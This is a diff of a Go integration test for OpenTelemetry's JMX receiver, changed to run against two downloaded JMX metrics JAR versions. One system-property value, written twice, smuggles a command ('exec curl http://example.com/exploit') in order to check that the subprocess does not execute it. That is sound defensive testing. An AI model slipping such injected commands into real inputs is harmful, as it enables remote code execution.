@@ -12,6 +12,7 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
+//go:build integration
 // +build integration
 
 package jmxreceiver
@@ -31,7 +32,6 @@ import (
 	"github.com/stretchr/testify/suite"
 	"github.com/testcontainers/testcontainers-go"
 	"github.com/testcontainers/testcontainers-go/wait"
-	"go.opentelemetry.io/collector/component"
 	"go.opentelemetry.io/collector/component/componenttest"
 	"go.opentelemetry.io/collector/consumer/consumertest"
 	"go.opentelemetry.io/collector/exporter/exporterhelper"
@@ -40,9 +40,14 @@ import (
 	"go.uber.org/zap/zaptest/observer"
 )
 
+var jmxJarReleases = map[string]string{
+	"1.0.0-alpha": "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-java-contrib-jmx-metrics/1.0.0-alpha/opentelemetry-java-contrib-jmx-metrics-1.0.0-alpha.jar",
+	"1.4.0-alpha": "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-jmx-metrics/1.4.0-alpha/opentelemetry-jmx-metrics-1.4.0-alpha.jar",
+}
+
 type JMXIntegrationSuite struct {
 	suite.Suite
-	JARPath string
+	VersionToJar map[string]string
 }
 
 func TestJMXIntegration(t *testing.T) {
@@ -50,17 +55,21 @@ func TestJMXIntegration(t *testing.T) {
 }
 
 func (suite *JMXIntegrationSuite) SetupSuite() {
-	jarPath, err := downloadJMXMetricGathererJAR()
-	require.NoError(suite.T(), err)
-	suite.JARPath = jarPath
+	suite.VersionToJar = make(map[string]string)
+	for version, url := range jmxJarReleases {
+		jarPath, err := downloadJMXMetricGathererJAR(url)
+		require.NoError(suite.T(), err)
+		suite.VersionToJar[version] = jarPath
+	}
 }
 
 func (suite *JMXIntegrationSuite) TearDownSuite() {
-	require.NoError(suite.T(), os.Remove(suite.JARPath))
+	for _, path := range suite.VersionToJar {
+		require.NoError(suite.T(), os.Remove(path))
+	}
 }
 
-func downloadJMXMetricGathererJAR() (string, error) {
-	url := "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-java-contrib-jmx-metrics/1.0.0-alpha/opentelemetry-java-contrib-jmx-metrics-1.0.0-alpha.jar"
+func downloadJMXMetricGathererJAR(url string) (string, error) {
 	resp, err := http.Get(url)
 	if err != nil {
 		return "", err
@@ -125,113 +134,120 @@ func getLogsOnFailure(t *testing.T, logObserver *observer.ObservedLogs) {
 }
 
 func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
-	t := suite.T()
-	cassandra := cassandraContainer(t)
-	defer cassandra.Terminate(context.Background())
-	hostname, err := cassandra.Host(context.Background())
-	require.NoError(t, err)
 
-	logCore, logObserver := observer.New(zap.DebugLevel)
-	defer getLogsOnFailure(t, logObserver)
+	for version, jar := range suite.VersionToJar {
+		t := suite.T()
+		// Run one test per JMX receiver version we're integrating with.
+		t.Run(version, func(t *testing.T) {
+			cassandra := cassandraContainer(t)
+			defer cassandra.Terminate(context.Background())
+			hostname, err := cassandra.Host(context.Background())
+			require.NoError(t, err)
 
-	logger := zap.New(logCore)
-	params := component.ReceiverCreateSettings{Logger: logger}
+			logCore, logObserver := observer.New(zap.DebugLevel)
+			defer getLogsOnFailure(t, logObserver)
 
-	cfg := &Config{
-		CollectionInterval: 100 * time.Millisecond,
-		Endpoint:           fmt.Sprintf("%v:7199", hostname),
-		JARPath:            suite.JARPath,
-		GroovyScript:       path.Join(".", "testdata", "script.groovy"),
-		OTLPExporterConfig: otlpExporterConfig{
-			Endpoint: "127.0.0.1:0",
-			TimeoutSettings: exporterhelper.TimeoutSettings{
-				Timeout: 1000 * time.Millisecond,
-			},
-		},
-		Password: "cassandra",
-		Username: "cassandra",
-		Properties: map[string]string{
-			// should be used by Autoconfigure to set resource attributes
-			"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
-			// test script sets dp labels from these system property values
-			"my.label.name": "mylabel", "my.label.value": "myvalue",
-			"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
-			// confirmation that arbitrary content isn't executed by subprocess
-			"one": "two & exec curl http://example.com/exploit && exit 123",
-		},
+			logger := zap.New(logCore)
+			params := componenttest.NewNopReceiverCreateSettings()
+			params.Logger = logger
+
+			cfg := &Config{
+				CollectionInterval: 100 * time.Millisecond,
+				Endpoint:           fmt.Sprintf("%v:7199", hostname),
+				JARPath:            jar,
+				GroovyScript:       path.Join(".", "testdata", "script.groovy"),
+				OTLPExporterConfig: otlpExporterConfig{
+					Endpoint: "127.0.0.1:0",
+					TimeoutSettings: exporterhelper.TimeoutSettings{
+						Timeout: 1000 * time.Millisecond,
+					},
+				},
+				Password: "cassandra",
+				Username: "cassandra",
+				Properties: map[string]string{
+					// should be used by Autoconfigure to set resource attributes
+					"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
+					// test script sets dp labels from these system property values
+					"my.label.name": "mylabel", "my.label.value": "myvalue",
+					"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
+					// confirmation that arbitrary content isn't executed by subprocess
+					"one": "two & exec curl http://example.com/exploit && exit 123",
+				},
+			}
+			require.NoError(t, cfg.validate())
+
+			consumer := new(consumertest.MetricsSink)
+			require.NotNil(t, consumer)
+
+			receiver := newJMXMetricReceiver(params, cfg, consumer)
+			require.NotNil(t, receiver)
+			defer func() {
+				require.Nil(t, receiver.Shutdown(context.Background()))
+			}()
+
+			require.NoError(t, receiver.Start(context.Background(), componenttest.NewNopHost()))
+
+			require.Eventually(t, func() bool {
+				found := consumer.DataPointCount() > 0
+				if !found {
+					return false
+				}
+
+				metric := consumer.AllMetrics()[0]
+				require.Equal(t, 1, metric.DataPointCount())
+
+				rm := metric.ResourceMetrics().At(0)
+				resource := rm.Resource()
+				attributes := resource.Attributes()
+				lang, ok := attributes.Get("telemetry.sdk.language")
+				require.True(t, ok)
+				require.Equal(t, "java", lang.StringVal())
+
+				sdkName, ok := attributes.Get("telemetry.sdk.name")
+				require.True(t, ok)
+				require.Equal(t, "opentelemetry", sdkName.StringVal())
+
+				version, ok := attributes.Get("telemetry.sdk.version")
+				require.True(t, ok)
+				require.NotEmpty(t, version.StringVal())
+
+				customAttr, ok := attributes.Get("myattr")
+				require.True(t, ok)
+				require.Equal(t, "myvalue", customAttr.StringVal())
+
+				anotherCustomAttr, ok := attributes.Get("myotherattr")
+				require.True(t, ok)
+				require.Equal(t, "myothervalue", anotherCustomAttr.StringVal())
+
+				ilm := rm.InstrumentationLibraryMetrics().At(0)
+				require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.InstrumentationLibrary().Name())
+				require.Equal(t, "1.0.0-alpha", ilm.InstrumentationLibrary().Version())
+
+				met := ilm.Metrics().At(0)
+
+				require.Equal(t, "cassandra.storage.load", met.Name())
+				require.Equal(t, "Size, in bytes, of the on disk data size this node manages", met.Description())
+				require.Equal(t, "By", met.Unit())
+
+				// otel-java only uses int sum w/ non-monotonic for up down counters instead of gauge
+				require.Equal(t, pdata.MetricDataTypeSum, met.DataType())
+				sum := met.Sum()
+				require.False(t, sum.IsMonotonic())
+
+				// These labels are determined by system properties
+				labels := sum.DataPoints().At(0).Attributes()
+				customLabel, ok := labels.Get("mylabel")
+				require.True(t, ok)
+				require.Equal(t, "myvalue", customLabel.StringVal())
+
+				anotherCustomLabel, ok := labels.Get("myotherlabel")
+				require.True(t, ok)
+				require.Equal(t, "myothervalue", anotherCustomLabel.StringVal())
+
+				return true
+			}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
+		})
 	}
-	require.NoError(t, cfg.validate())
-
-	consumer := new(consumertest.MetricsSink)
-	require.NotNil(t, consumer)
-
-	receiver := newJMXMetricReceiver(params, cfg, consumer)
-	require.NotNil(t, receiver)
-	defer func() {
-		require.Nil(t, receiver.Shutdown(context.Background()))
-	}()
-
-	require.NoError(t, receiver.Start(context.Background(), componenttest.NewNopHost()))
-
-	require.Eventually(t, func() bool {
-		found := consumer.DataPointCount() > 0
-		if !found {
-			return false
-		}
-
-		metric := consumer.AllMetrics()[0]
-		require.Equal(t, 1, metric.DataPointCount())
-
-		rm := metric.ResourceMetrics().At(0)
-		resource := rm.Resource()
-		attributes := resource.Attributes()
-		lang, ok := attributes.Get("telemetry.sdk.language")
-		require.True(t, ok)
-		require.Equal(t, "java", lang.StringVal())
-
-		sdkName, ok := attributes.Get("telemetry.sdk.name")
-		require.True(t, ok)
-		require.Equal(t, "opentelemetry", sdkName.StringVal())
-
-		version, ok := attributes.Get("telemetry.sdk.version")
-		require.True(t, ok)
-		require.NotEmpty(t, version.StringVal())
-
-		customAttr, ok := attributes.Get("myattr")
-		require.True(t, ok)
-		require.Equal(t, "myvalue", customAttr.StringVal())
-
-		anotherCustomAttr, ok := attributes.Get("myotherattr")
-		require.True(t, ok)
-		require.Equal(t, "myothervalue", anotherCustomAttr.StringVal())
-
-		ilm := rm.InstrumentationLibraryMetrics().At(0)
-		require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.InstrumentationLibrary().Name())
-		require.Equal(t, "1.0.0-alpha", ilm.InstrumentationLibrary().Version())
-
-		met := ilm.Metrics().At(0)
-
-		require.Equal(t, "cassandra.storage.load", met.Name())
-		require.Equal(t, "Size, in bytes, of the on disk data size this node manages", met.Description())
-		require.Equal(t, "By", met.Unit())
-
-		// otel-java only uses int sum w/ non-monotonic for up down counters instead of gauge
-		require.Equal(t, pdata.MetricDataTypeSum, met.DataType())
-		sum := met.Sum()
-		require.False(t, sum.IsMonotonic())
-
-		// These labels are determined by system properties
-		labels := sum.DataPoints().At(0).LabelsMap()
-		customLabel, ok := labels.Get("mylabel")
-		require.True(t, ok)
-		require.Equal(t, "myvalue", customLabel)
-
-		anotherCustomLabel, ok := labels.Get("myotherlabel")
-		require.True(t, ok)
-		require.Equal(t, "myothervalue", anotherCustomLabel)
-
-		return true
-	}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
 }
 
 func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
@@ -240,6 +256,7 @@ func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
 		CollectionInterval: 100 * time.Millisecond,
 		Endpoint:           fmt.Sprintf("service:jmx:rmi:///jndi/rmi://localhost:7199/jmxrmi"),
 		JARPath:            "/notavalidpath",
+		Properties:         make(map[string]string),
 		GroovyScript:       path.Join(".", "testdata", "script.groovy"),
 		OTLPExporterConfig: otlpExporterConfig{
 			Endpoint: "<invalid>:123",
